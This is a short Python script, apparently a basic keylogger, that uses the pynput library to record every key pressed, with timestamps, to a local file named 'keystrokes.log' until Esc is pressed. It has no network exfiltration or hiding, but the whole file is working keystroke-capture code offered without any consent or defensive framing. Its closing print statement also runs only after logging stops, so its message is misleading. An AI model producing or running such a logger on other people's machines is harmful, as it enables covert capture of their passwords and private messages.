from pynput import keyboard
import logging

# Set up logging to store keystrokes in a file
LOG_FILE = "keystrokes.log"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop logging when 'Esc' is pressed
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Keystrokes are being logged in {LOG_FILE}")
